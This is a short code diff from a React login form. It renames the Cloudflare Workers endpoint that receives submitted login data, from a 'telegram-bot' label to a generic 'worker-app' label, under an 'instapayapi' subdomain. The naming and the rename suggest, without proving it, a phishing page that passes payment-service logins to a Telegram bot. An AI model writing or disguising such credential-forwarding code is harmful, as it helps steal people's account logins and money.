@@ -384,7 +384,7 @@ const [attemptCount, setAttemptCount] = useState(0);
   setIsSubmitting(true);
 
   try {
-    const response = await fetch("https://my-telegram-bot.instapayapi.workers.dev/api/login2", {
+    const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/login2", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
